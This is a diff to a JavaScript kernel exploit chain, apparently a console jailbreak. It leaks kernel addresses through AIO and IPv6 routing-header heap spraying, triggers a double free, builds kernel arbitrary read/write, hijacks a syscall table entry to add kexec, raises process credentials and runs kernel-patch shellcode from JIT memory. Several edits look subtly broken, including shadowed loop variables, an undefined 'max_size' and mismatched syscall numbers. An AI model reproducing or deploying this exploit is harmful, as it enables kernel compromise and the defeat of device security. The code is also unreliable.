@@ -729,7 +729,7 @@ function leak_kernel_addrs(sd_pair) {
 
   log("find aio_entry");
   let reqs2_off = null;
-  for (let i = 0; i < num_leaks; i++) {
+  loop: for (let i = 0; i < num_leaks; i++) {
     get_rthdr(sd, buf);
 
     spray_aio(num_handles, leak_reqs_p, num_elems, leak_ids_p, true, AIO_CMD_WRITE);
@@ -739,11 +739,10 @@ function leak_kernel_addrs(sd_pair) {
       if (verify_reqs2(buf, off)) {
         reqs2_off = off;
         log(`found reqs2 at attempt: ${i}`);
-        break;
+        break loop;
       }
     }
 
-    if (reqs2_off !== null) break;
     free_aios(leak_ids_p, leak_ids_len);
   }
   if (reqs2_off === null) {
@@ -888,7 +887,7 @@ function double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd, sds) {
   let req_id = null;
   close(sd);
   sd = null;
-  for (let i = 0; i < num_alias; i++) {
+  loop: for (let i = 0; i < num_alias; i++) {
     for (const sd of sds) {
       set_rthdr(sd, reqs2, rsize);
     }
@@ -912,14 +911,14 @@ function double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd, sds) {
 
         poll_aio(req_id, states);
         log(`states[${req_idx}]: ${hex(states[0])}`);
-        for (let j = 0; j < num_sds; j++) {
-          const sd2 = sds[j];
+        for (let i = 0; i < num_sds; i++) {
+          const sd2 = sds[i];
           get_rthdr(sd2, reqs2);
           const done = reqs2[reqs3_off + 0xc];
           if (done) {
             hexdump(reqs2);
             sd = sd2;
-            sds.splice(j, 1);
+            sds.splice(i, 1);
             free_rthdrs(sds);
             sds.push(new_socket());
             break;
@@ -930,10 +929,9 @@ function double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd, sds) {
         }
         log(`sd: ${sd}`);
 
-        break;
+        break loop;
       }
     }
-    if (req_id !== null) break;
   }
   if (req_id === null) {
     die("failed to overwrite AIO queue entry");
@@ -989,9 +987,9 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
   let reclaim_sd = null;
   close(pktopts_sds[1]);
   for (let i = 0; i < num_alias; i++) {
-    for (let j = 0; j < num_sds; j++) {
-      pktopts.write32(off_tclass, 0x4141 | (j << 16));
-      set_rthdr(sds[j], pktopts, rsize);
+    for (let i = 0; i < num_sds; i++) {
+      pktopts.write32(off_tclass, 0x4141 | (i << 16));
+      set_rthdr(sds[i], pktopts, rsize);
     }
 
     gsockopt(psd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
@@ -1156,30 +1154,46 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
 
     copyin(src, dst, len) {
       this._verify_len(len);
-      const { main_sd, worker_sd, addr_buf, data_buf, wpipe } = this;
+      const main = this.main_sd;
+      const worker = this.worker_sd;
+      const addr_buf = this.addr_buf;
+      const data_buf = this.data_buf;
+
       addr_buf.write64(0, this.pipe_addr);
-      ssockopt(main_sd, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
+      ssockopt(main, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
+
       data_buf.write64(0, 0);
-      ssockopt(worker_sd, IPPROTO_IPV6, IPV6_PKTINFO, data_buf);
+      ssockopt(worker, IPPROTO_IPV6, IPV6_PKTINFO, data_buf);
+
       addr_buf.write64(0, this.pipe_addr2);
-      ssockopt(main_sd, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
+      ssockopt(main, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
+
       addr_buf.write64(0, dst);
-      ssockopt(worker_sd, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
-      sysi("write", wpipe, src, len);
+      ssockopt(worker, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
+
+      sysi("write", this.wpipe, src, len);
     }
 
     copyout(src, dst, len) {
       this._verify_len(len);
-      const { main_sd, worker_sd, addr_buf, data_buf, rpipe } = this;
+      const main = this.main_sd;
+      const worker = this.worker_sd;
+      const addr_buf = this.addr_buf;
+      const data_buf = this.data_buf;
+
       addr_buf.write64(0, this.pipe_addr);
-      ssockopt(main_sd, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
+      ssockopt(main, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
+
       data_buf.write32(0, 0x40000000);
-      ssockopt(worker_sd, IPPROTO_IPV6, IPV6_PKTINFO, data_buf);
+      ssockopt(worker, IPPROTO_IPV6, IPV6_PKTINFO, data_buf);
+
       addr_buf.write64(0, this.pipe_addr2);
-      ssockopt(main_sd, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
+      ssockopt(main, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
+
       addr_buf.write64(0, src);
-      ssockopt(worker_sd, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
-      sysi("read", rpipe, dst, len);
+      ssockopt(worker, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
+
+      sysi("read", this.rpipe, dst, len);
     }
 
     _read(addr) {
@@ -1269,26 +1283,21 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
 
   log("change sys_aio_submit() to sys_kexec()");
   const sysent_661 = kbase.add(off_sysent_661);
-  const sysent_size = 0x30;
-  const sysent_save = new Buffer(sysent_size);
-  for (let off = 0; off < sysent_size; off += 8) {
-    sysent_save.write64(off, kmem.read64(sysent_661.add(off)));
+  const sysent_661_save = new Buffer(0x30);
+  for (let off = 0; off < sysent_661_save.size; off += 8) {
+    sysent_661_save.write64(off, kmem.read64(sysent_661.add(off)));
   }
-  log(`sysent[661] saved at addr: ${sysent_save.addr}`);
-  log("sysent[661] saved data:");
-  hexdump(sysent_save);
+  log(`sysent[611] save addr: ${sysent_661_save.addr}`);
+  log("sysent[611] save data:");
+  hexdump(sysent_661_save);
+  kmem.write32(sysent_661, 6);
+  kmem.write64(sysent_661.add(8), kbase.add(jmp_rsi));
+  kmem.write32(sysent_661.add(0x2c), 1);
 
-  kmem.write32(sysent_661, 6); // nargs
-  kmem.write64(sysent_661.add(8), kbase.add(jmp_rsi)); // sys_kexec
-  kmem.write32(sysent_661.add(0x2c), 1); // sy_flags
+  log("set the bits for JIT privs");
+  kmem.write64(p_ucred.add(0x60), -1);
+  kmem.write64(p_ucred.add(0x68), -1);
 
-  // Grant JIT privileges
-  log("Setting JIT privileges");
-  kmem.write64(p_ucred.add(0x60), -1); // cr_uid, cr_ruid, cr_svuid
-  kmem.write64(p_ucred.add(0x68), -1); // cr_rgid, cr_svgid
-
-  // Load and validate patch binary
-  log("Loading kernel patch binary");
   const buf = await get_binary(patch_elf_loc);
   const patches = new View1(buf);
   let map_size = patches.size;
@@ -1299,68 +1308,55 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
   if (map_size === 0) {
     die("patch file size is zero");
   }
-  log(`Kernel patch size: ${map_size} bytes`);
-  map_size = (map_size + page_size - 1) & ~(page_size - 1); // Align to page size
+  log(`kpatch size: ${map_size} bytes`);
+  map_size = (map_size + page_size) & -page_size;
 
-  // JIT shared memory setup
-  const PROT_RW = PROT_READ | PROT_WRITE;
-  const PROT_RX = PROT_READ | PROT_EXEC;
-  const PROT_RWX = PROT_READ | PROT_WRITE | PROT_EXEC;
-  const exec_addr = new Int(0, 9); // Base address for executable mapping
-  const write_addr = new Int(map_size, 9); // Base address for writable mapping
+  const prot_rw = 3;
+  const prot_rx = 5;
+  const prot_rwx = 7;
+  const exec_p = new Int(0, 9);
+  const write_p = new Int(max_size, 9);
 
-  log("Creating JIT shared memory");
-  const exec_fd = sysi("jitshm_create", 0, map_size, PROT_RWX);
-  const write_fd = sysi("jitshm_alias", exec_fd, PROT_RW);
-  if (exec_fd < 0 || write_fd < 0) {
-    die("Failed to create JIT shared memory");
+  log("open JIT fds")
+  const exec_fd = sysi("jitshm_create", 0, map_size, prot_rwx);
+  const write_fd = sysi("jitshm_alias", exec_fd, prot_rw);
+
+  log("mmap for kpatch shellcode");
+  const exec_addr = chain.sysp("mmap", exec_p, map_size, prot_rx, MAP_SHARED | MAP_FIXED, exec_fd, 0);
+  const write_addr = chain.sysp("mmap", write_p, map_size, prot_rw, MAP_SHARED | MAP_FIXED, write_fd, 0);
+
+  log(`exec_addr: ${exec_addr}`);
+  log(`write_addr: ${write_addr}`);
+  if (exec_addr.ne(exec_p) || write_addr.ne(write_p)) {
+    die("mmap() for jit failed");
   }
 
-  // Map JIT memory
-  log("Mapping JIT memory for kernel patch");
-  const exec_map = chain.sysp("mmap", exec_addr, map_size, PROT_RX, MAP_SHARED | MAP_FIXED, exec_fd, 0);
-  const write_map = chain.sysp("mmap", write_addr, map_size, PROT_RW, MAP_SHARED | MAP_FIXED, write_fd, 0);
-  log(`Executable mapping at: ${exec_map}`);
-  log(`Writable mapping at: ${write_map}`);
+  log("mlock exec_addr for kernel exec");
+  sysi("mlock", exec_addr, map_size);
 
-  if (exec_map.ne(exec_addr) || write_map.ne(write_addr)) {
-    die("JIT memory mapping failed");
-  }
-
-  // Lock executable mapping
-  log("Locking executable mapping");
-  sysi("mlock", exec_map, map_size);
-
-  // Test JIT execution
-  log("Testing JIT execution");
   const test_code = new Int(0x001337b8, 0xc300);
-  kmem.copyin(test_code.addr, write_map, 8);
-  sys_void("kexec", exec_map);
-  const retval = chain.errno;
-  log(`JIT test return value: ${retval}`);
+  write_addr.write64(0, test_code);
+
+  log("test jit exec");
+  sys_void("kexec", exec_addr);
+  let retval = chain.errno;
+  log("returned successfully");
+
+  log(`jit retval: ${retval}`);
   if (retval !== 0x1337) {
-    die("JIT execution test failed");
+    die("test jit exec failed");
   }
 
-  // Lock restore data
-  log("Locking restore data");
+  log("mlock saved data for kernel restore");
   const pipe_save = restore_info[1];
   restore_info[1] = pipe_save.addr;
   sysi("mlock", restore_info[1], page_size);
-  restore_info[4] = sysent_save.addr;
+  restore_info[4] = sysent_661_save.addr;
   sysi("mlock", restore_info[4], page_size);
 
-  // Copy and execute patch
-  log("Copying and executing kernel patch");
-  kmem.copyin(patches.addr, write_map, patches.size);
-  sys_void("kexec", exec_map, ...restore_info);
-
-  // Cleanup JIT mappings
-  log("Cleaning up JIT mappings");
-  sysi("munmap", exec_map, map_size);
-  sysi("munmap", write_map, map_size);
-  sysi("close", exec_fd);
-  sysi("close", write_fd);
+  log("execute kpatch...")
+  mem.cpy(write_addr, patches.addr, patches.size);
+  sys_void("kexec", exec_addr, ...restore_info);
 }
 
 function setup(block_fd) {
@@ -1523,7 +1519,7 @@ function runBinLoader() {
   loader_writer[16] = 0x000095e8;
   loader_writer[17] = 0xff894400;
   loader_writer[18] = 0x000001be;
-  loader_writer[19] = 0x0095e8;
+  loader_writer[19] = 0x0095e800;
   loader_writer[20] = 0x89440000;
   loader_writer[21] = 0x31f631ff;
   loader_writer[22] = 0x0062e8d2;
